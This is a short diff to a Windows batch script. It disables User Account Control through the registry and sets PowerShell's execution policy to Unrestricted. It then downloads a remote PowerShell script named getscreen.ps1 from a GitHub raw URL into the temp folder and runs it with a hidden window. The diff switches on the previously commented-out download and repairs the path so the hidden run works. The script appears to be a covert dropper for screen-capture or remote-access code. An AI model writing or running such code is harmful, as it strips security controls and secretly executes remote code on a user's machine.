@@ -7,7 +7,7 @@ echo Skip UAC...
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 echo Download and save the Script to the temp folder
 powershell -Command "Set-ExecutionPolicy Unrestricted -Force -Scope CurrentUser"
-rem powershell -Command "curl https://raw.githubusercontent.com/d3d0n/funwngrok/main/getscreen.ps1 -o $env:temp\getscreen.ps1"
+powershell -Command "(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/d3d0n/funwngrok/main/getscreen.ps1', \"$env:temp\getscreen.ps1\")"
 echo Run the Script Without Powershell Window
-powershell -Command "& .\getscreen.ps1 -WindowStyle Hidden"
+powershell -Command "& \"$env:temp\getscreen.ps1\" -WindowStyle Hidden"
 echo Done!
